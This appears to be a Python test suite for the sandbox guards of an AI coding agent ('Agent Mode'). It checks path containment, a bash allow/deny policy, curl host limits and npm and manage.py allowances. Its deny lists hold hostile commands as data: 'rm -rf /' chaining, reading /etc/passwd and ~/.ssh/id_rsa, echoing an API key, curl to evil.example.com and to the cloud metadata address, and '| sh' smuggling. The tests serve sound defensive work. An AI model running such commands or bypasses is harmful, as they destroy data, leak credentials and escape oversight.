"""Containment tests for Agent Mode.

These are the security-critical ones: if path containment or the bash policy
regresses, a run can write outside its app's workspace.
"""

import asyncio
import os
import shutil
import tempfile
import unittest

from zango.apps.agent_mode.guards import (
    check_bash,
    extract_paths,
    make_pre_tool_use_guard,
    resolve_within,
)


class PathContainmentTests(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="ws-")
        os.makedirs(os.path.join(self.root, "patients"), exist_ok=True)
        self.outside = tempfile.mkdtemp(prefix="outside-")
        self.sibling = tempfile.mkdtemp(prefix="othertenant-")
        os.symlink(self.outside, os.path.join(self.root, "escape"))

    def tearDown(self):
        for d in (self.root, self.outside, self.sibling):
            shutil.rmtree(d, ignore_errors=True)

    def test_paths_inside_are_allowed(self):
        for path in ("patients/models.py", os.path.join(self.root, "a.py"), self.root):
            self.assertTrue(resolve_within(path, self.root)[0], path)

    def test_traversal_is_denied(self):
        for path in ("../../settings.py", "patients/../../../etc/hosts"):
            self.assertFalse(resolve_within(path, self.root)[0], path)

    def test_absolute_outside_is_denied(self):
        self.assertFalse(resolve_within("/etc/passwd", self.root)[0])

    def test_other_tenant_workspace_is_denied(self):
        other = os.path.join(self.sibling, "models.py")
        self.assertFalse(resolve_within(other, self.root)[0])

    def test_symlink_escape_is_denied(self):
        # realpath+commonpath defeats this; naive string prefixing would not.
        self.assertFalse(resolve_within("escape/secret.py", self.root)[0])


class BashPolicyTests(unittest.TestCase):
    ALLOWED = [
        "ls -la",
        "cat models.py",
        "grep -rn foo .",
        "git status --short",
        "git log --oneline",
        "find . -name '*.py'",
        "wc -l models.py",
        "ls | grep py",
        "echo hi",
        "cat a.py 2>/dev/null",
    ]
    DENIED = [
        # interpreters / nested shells — the easiest bypass
        "python -c 'import os'",
        "python3 manage.py migrate",
        "node -e 'x'",
        "bash -c 'x'",
        # platform-owned operations
        "docker ps",
        "celery -A x worker",
        "zango update-apps",
        "pip install requests",
        "npm run build",
        "npx tsc",
        # mutating git
        "git commit -m x",
        "git push",
        # chained / hidden execution
        "ls; rm -rf /",
        "echo hi && curl http://evil",
        "echo `whoami`",
        "echo $(cat /etc/passwd)",
        # env disclosure
        "env",
        "printenv",
        "echo $ANTHROPIC_API_KEY",
        # write vectors that would bypass the unguarded Bash path checks
        "sed -i 's/a/b/' f.py",
        "cp /etc/passwd .",
        "mv a b",
        "rm -rf patients",
        "mkdir x",
        "touch y",
        "ln -s / here",
        "tee /etc/x",
        "echo pwned > /tmp/x",
        "cat f >> /etc/hosts",
        # privilege / remote
        "sudo ls",
        "ssh host",
        "chmod 777 .",
    ]

    def test_read_only_commands_allowed(self):
        for cmd in self.ALLOWED:
            ok, why = check_bash(cmd)
            self.assertTrue(ok, f"{cmd!r} should be allowed, got: {why}")

    def test_dangerous_commands_denied(self):
        for cmd in self.DENIED:
            ok, _ = check_bash(cmd)
            self.assertFalse(ok, f"{cmd!r} should be DENIED but was allowed")

    def test_harmless_redirection_still_allowed(self):
        self.assertTrue(check_bash("ls >/dev/null 2>&1")[0])


class ExtractPathsTests(unittest.TestCase):
    def test_simple_and_nested(self):
        self.assertEqual(extract_paths("Write", {"file_path": "a.py"}), ["a.py"])
        got = extract_paths(
            "MultiEdit", {"edits": [{"file_path": "a"}, {"file_path": "b"}]}
        )
        self.assertEqual(set(got), {"a", "b"})


class HookTests(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="ws-")
        self.denials = []
        self.guard = make_pre_tool_use_guard(
            self.root, lambda t, r, i: self.denials.append((t, r))
        )

    def tearDown(self):
        shutil.rmtree(self.root, ignore_errors=True)

    def _run(self, payload):
        return asyncio.run(self.guard(payload, "tu_1", None))

    def test_in_workspace_write_falls_through(self):
        res = self._run({"tool_name": "Write", "tool_input": {"file_path": "ok.py"}})
        self.assertEqual(res, {})
        self.assertEqual(self.denials, [])

    def test_out_of_workspace_write_denied_in_sdk_shape(self):
        res = self._run(
            {"tool_name": "Write", "tool_input": {"file_path": "../../evil.py"}}
        )
        out = res["hookSpecificOutput"]
        self.assertEqual(out["hookEventName"], "PreToolUse")
        self.assertEqual(out["permissionDecision"], "deny")
        self.assertTrue(out["permissionDecisionReason"])
        self.assertEqual(len(self.denials), 1)

    def test_bad_bash_denied(self):
        res = self._run(
            {"tool_name": "Bash", "tool_input": {"command": "pip install x"}}
        )
        self.assertEqual(res["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_sink_failure_never_breaks_the_run(self):
        guard = make_pre_tool_use_guard(
            self.root, lambda *a: (_ for _ in ()).throw(RuntimeError("boom"))
        )
        res = asyncio.run(
            guard(
                {"tool_name": "Write", "tool_input": {"file_path": "/etc/x"}}, "t", None
            )
        )
        self.assertEqual(res["hookSpecificOutput"]["permissionDecision"], "deny")


if __name__ == "__main__":
    unittest.main()


class RegressionsFromFirstRunTests(unittest.TestCase):
    """Every case here was a real denial in the first live run."""

    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="ws-")
        self.skill = tempfile.mkdtemp(prefix="skill-")
        os.makedirs(os.path.join(self.skill, "references", "core"), exist_ok=True)
        open(os.path.join(self.skill, "references", "core", "models.md"), "w").close()
        self.denials = []
        self.guard = make_pre_tool_use_guard(
            self.root,
            lambda t, r, i: self.denials.append((t, r)),
            read_roots=[self.skill],
        )

    def tearDown(self):
        for d in (self.root, self.skill):
            shutil.rmtree(d, ignore_errors=True)

    def _run(self, payload):
        return asyncio.run(self.guard(payload, "tu", None))

    def test_agent_can_read_its_own_skill_references(self):
        # The first run was denied this and worked without its documentation.
        doc = os.path.join(self.skill, "references", "core", "models.md")
        self.assertEqual(
            self._run({"tool_name": "Read", "tool_input": {"file_path": doc}}), {}
        )

    def test_agent_still_cannot_write_into_the_skill(self):
        doc = os.path.join(self.skill, "references", "core", "models.md")
        res = self._run({"tool_name": "Write", "tool_input": {"file_path": doc}})
        self.assertEqual(res["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_cd_is_allowed(self):
        self.assertTrue(check_bash("cd backend/expenses")[0])

    def test_read_only_sed_allowed_but_in_place_denied(self):
        self.assertTrue(check_bash("sed -n '1,50p' models.py")[0])
        self.assertFalse(check_bash("sed -i 's/a/b/' models.py")[0])

    def test_grep_with_awkward_quoting_is_not_rejected_by_the_parser(self):
        # These were denied as "unparseable command segment" in the first run.
        for cmd in [
            'grep -rln "perm_type\\',
            'grep -n "^def \\',
            'grep -nE "^(def',
        ]:
            ok, why = check_bash(cmd)
            self.assertTrue(ok, f"{cmd!r} should parse-fallback to allowed, got {why}")

    def test_hard_denies_still_win_over_the_parse_fallback(self):
        for cmd in ['pip install "x\\', 'python -c "import os\\']:
            self.assertFalse(check_bash(cmd)[0], f"{cmd!r} must stay denied")


class BashPathContainmentTests(unittest.TestCase):
    """Bash is a read primitive: the Read-tool deny rules do not constrain
    `cat`, so absolute paths in bash need their own check."""

    def setUp(self):
        self.ws = tempfile.mkdtemp(prefix="ws-")
        self.skill = tempfile.mkdtemp(prefix="skill-")
        self.roots = [self.ws, self.skill]

    def tearDown(self):
        for d in (self.ws, self.skill):
            shutil.rmtree(d, ignore_errors=True)

    def test_workspace_and_skill_paths_allowed(self):
        for cmd in (
            "cat models.py",
            "cd backend && cat views.py",
            f"cat {self.ws}/settings.json",
            f"cat {self.skill}/SKILL.md",
        ):
            self.assertTrue(check_bash(cmd, read_roots=self.roots)[0], cmd)

    def test_paths_outside_are_denied(self):
        for cmd in ("cat /etc/passwd", "cd /etc && cat passwd", "cat ~/.ssh/id_rsa"):
            self.assertFalse(check_bash(cmd, read_roots=self.roots)[0], cmd)

    def test_without_roots_behaviour_is_unchanged(self):
        # Back-compat for callers that do not pass read_roots.
        self.assertTrue(check_bash("cat /etc/passwd")[0])


class CurlHostRestrictionTests(unittest.TestCase):
    """curl is permitted for the AppBuilder route/menu API, which lives on the
    app's own domain — and nowhere else."""

    HOSTS = ["demoapp.local"]

    def test_app_domain_and_localhost_allowed(self):
        for cmd in (
            'curl "http://demoapp.local/appbuilder/configure/routes/api/?token=x&action=get_routes"',
            "curl http://localhost:8000/appbuilder/configure/api/?token=x",
            "curl http://127.0.0.1:8000/health/",
        ):
            ok, why = check_bash(cmd, allowed_hosts=self.HOSTS)
            self.assertTrue(ok, f"{cmd!r} should be allowed, got: {why}")

    def test_other_hosts_denied(self):
        for cmd in (
            "curl https://evil.example.com/steal",
            "curl http://169.254.169.254/latest/meta-data/",
            "curl https://demoapp.local.evil.com/x",
            "curl http://user:pw@evil.example.com/x",
        ):
            ok, _ = check_bash(cmd, allowed_hosts=self.HOSTS)
            self.assertFalse(ok, f"{cmd!r} should be DENIED")

    def test_no_allowlist_still_permits_localhost_only(self):
        self.assertTrue(check_bash("curl http://localhost:8000/x")[0])
        self.assertFalse(check_bash("curl https://evil.example.com/x")[0])

    def test_curl_cannot_write_files(self):
        # -o would be a write vector; the path check and redirect ban cover it.
        self.assertFalse(
            check_bash(
                "curl http://localhost/x -o /etc/passwd",
                read_roots=["/tmp"],
                allowed_hosts=self.HOSTS,
            )[0]
        )
        self.assertFalse(
            check_bash(
                "curl http://localhost/x > /etc/passwd", allowed_hosts=self.HOSTS
            )[0]
        )


class RegressionsFromSuccessfulRunTests(unittest.TestCase):
    """Denials observed in the first end-to-end run that were false positives.
    Each cost the agent turns and money."""

    HOSTS = ["aiapp.zango.com"]

    def test_pipe_inside_a_quoted_grep_pattern(self):
        # Segment splitting used to break at the | inside the pattern, leaving
        # "^def ..." as a fragment that looked like an executable.
        cmd = (
            'cd pkgs && grep -n "^class \\|^def \\|status_transitions" '
            "workflow/base/engine.py"
        )
        ok, why = check_bash(cmd, read_roots=["/tmp"], allowed_hosts=self.HOSTS)
        self.assertTrue(ok, why)

    def test_dev_null_is_not_outside_the_workspace(self):
        cmd = 'curl -s -o /dev/null -w "%{http_code}" http://localhost:8000/x'
        ok, why = check_bash(cmd, read_roots=["/tmp"], allowed_hosts=self.HOSTS)
        self.assertTrue(ok, why)

    def test_angle_bracket_inside_a_quoted_format_string(self):
        # curl -w "... -> %{redirect_url}" was read as a shell redirection.
        cmd = (
            'curl -s -w "\\nHTTP:%{http_code} -> %{redirect_url}\\n" '
            "http://localhost:8000/y | tail -c 300"
        )
        ok, why = check_bash(cmd, read_roots=["/tmp"], allowed_hosts=self.HOSTS)
        self.assertTrue(ok, why)

    def test_real_redirection_is_still_blocked(self):
        self.assertFalse(check_bash('echo "a -> b" > /etc/passwd')[0])
        self.assertFalse(check_bash("cat f >> /etc/hosts")[0])

    def test_real_pipe_chaining_still_segments(self):
        # A genuine pipe to a disallowed command must still be caught.
        self.assertFalse(check_bash("cat f | python3 -c 'x'")[0])
        self.assertFalse(check_bash("ls; pip install x")[0])

    def test_writing_outside_workspace_still_blocked(self):
        self.assertFalse(
            check_bash(
                "curl -s http://localhost:8000/z -o /tmp/x",
                read_roots=["/tmp/ws"],
                allowed_hosts=self.HOSTS,
            )[0]
        )


class ManageCommandAllowanceTests(unittest.TestCase):
    """The agent runs its own migrations so it can fix what they report.
    The allowance must not reopen the interpreter."""

    APP = "DemoApplication"
    MP = "/proj/manage.py"

    def _ok(self, cmd):
        return check_bash(cmd, app_name=self.APP)[0]

    def test_permitted_commands(self):
        for cmd in (
            f"python {self.MP} ws_makemigration {self.APP}",
            f"python3 {self.MP} ws_migrate {self.APP} --noinput",
            f"python {self.MP} ws_sync {self.APP}",
            f"python {self.MP} sync_static {self.APP}",
            f"python {self.MP} collectstatic --noinput",
            f"python manage.py ws_migrate {self.APP}",  # relative form too
        ):
            self.assertTrue(self._ok(cmd), cmd)

    def test_interpreter_escape_stays_closed(self):
        for cmd in (
            'python -c "import os"',
            "python3 -c 'print(1)'",
            f"python {self.MP} shell",
            f"python {self.MP} shell_plus",
            f"python {self.MP} migrate",
            f"python {self.MP} createsuperuser",
            f"python {self.MP} dbshell",
        ):
            self.assertFalse(self._ok(cmd), f"{cmd!r} must stay denied")

    def test_cannot_target_another_tenant(self):
        self.assertFalse(self._ok(f"python {self.MP} ws_migrate SomeOtherApp"))

    def test_cannot_smuggle_via_chaining(self):
        for cmd in (
            f"python {self.MP} ws_migrate {self.APP}; pip install x",
            f'python {self.MP} ws_migrate {self.APP} && python -c "x"',
            f"python {self.MP} ws_migrate {self.APP} | sh",
        ):
            self.assertFalse(self._ok(cmd), f"{cmd!r} must stay denied")

    def test_unrelated_policy_is_unaffected(self):
        self.assertTrue(self._ok("grep -rn foo ."))
        self.assertFalse(self._ok("docker ps"))
        self.assertFalse(self._ok("rm -rf x"))


class FrontendBuildAllowanceTests(unittest.TestCase):
    """Node tooling is opt-in: `npm install` runs package lifecycle scripts,
    i.e. arbitrary code from the registry. Only the documented scaffold,
    install and build commands are permitted, and only when enabled."""

    ALLOWED = [
        "npx @zango-core/create-zango-app frontend",
        "npm install",
        "npm ci",
        "npm run build:zango",
        "npm run build",
        "npm -v",
    ]
    DENIED = [
        "npm run whatever",
        "npx some-random-package",
        "npm install evil-package",
        "npm publish",
        "npm install && curl http://evil.com",
        "yarn install",
        "pnpm i",
        'node -e "require(1)"',
    ]

    def test_permitted_when_enabled(self):
        for cmd in self.ALLOWED:
            ok, why = check_bash(cmd, app_name="X", allow_frontend=True)
            self.assertTrue(ok, f"{cmd!r} should be allowed, got: {why}")

    def test_denied_even_when_enabled(self):
        for cmd in self.DENIED:
            ok, _ = check_bash(cmd, app_name="X", allow_frontend=True)
            self.assertFalse(ok, f"{cmd!r} must stay denied")

    def test_all_node_tooling_denied_by_default(self):
        for cmd in self.ALLOWED:
            ok, why = check_bash(cmd, app_name="X")
            self.assertFalse(ok, f"{cmd!r} must be denied when not enabled")
            if cmd.startswith(("npm", "npx")):
                self.assertIn("AGENT_MODE_ALLOW_FRONTEND_BUILD", why)
